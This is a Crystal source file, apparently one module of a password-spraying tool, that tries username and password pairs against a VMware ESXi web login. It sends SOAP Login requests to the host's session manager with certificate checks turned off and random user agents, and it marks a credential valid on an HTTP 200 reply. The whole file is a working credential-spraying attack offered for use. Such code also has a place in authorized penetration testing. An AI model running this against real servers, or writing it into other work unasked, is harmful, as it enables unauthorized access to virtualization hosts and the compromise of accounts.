require "http/client"

class ESXI_web < Sprayer

    ## only uncomment if needed
    # def initialize(usernames : Array(String), password : Array(String))
    #     # init any special or default variables here
    #     super()
    # end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) 
        lockedout = false
        valid = false
        mfa = false

        # 
        # YOUR CODE BELOW 
        #

        # some basic setups for web based auth 
        url = URI.parse @target 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        header = HTTP::Headers{ # basic template for headers for post/get request 
            "User-Agent" => @useragents[rand(0..(@useragents.size - 1))], # uses a random header theres only 1 by default 
            "Accept" => "*/*",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Cookie" => "vmware_client=VMware",
            "Content-Type" => "text/xml",
            "Origin" => "https://#{url.host}",
            "Referer" => "https://#{url.host}/ui"
        } 

        # form = "username=#{username}&password=#{password}" # request form params here\
        
        body = "<Envelope xmlns=\"http://schemas.xmlsoap.org/soap/envelope/\"  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><Body><Login xmlns=\"urn:vim25\"><_this type=\"SessionManager\">ha-sessionmgr</_this><userName>#{username}</userName><password>#{password}</password><locale>en-US</locale></Login></Body></Envelope>"

        error_code  = "<faultstring>Cannot complete login due to an incorrect user name or password.</faultstring>" # this means no go for login 
        
        # here is the basic request 
        page = client.post(url.path, headers: header, body: body) 
        # puts  page.body

        #
        # logic for if valid login goes here replace whats here. it only serves as a guide for quick editing 
        # 
        # 
        # login success returns 200. failure returns 500 
        if page.status_code == 200 # if ok 
            valid = true 
        end

        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        return [username, password, valid, lockedout, mfa]
    end
end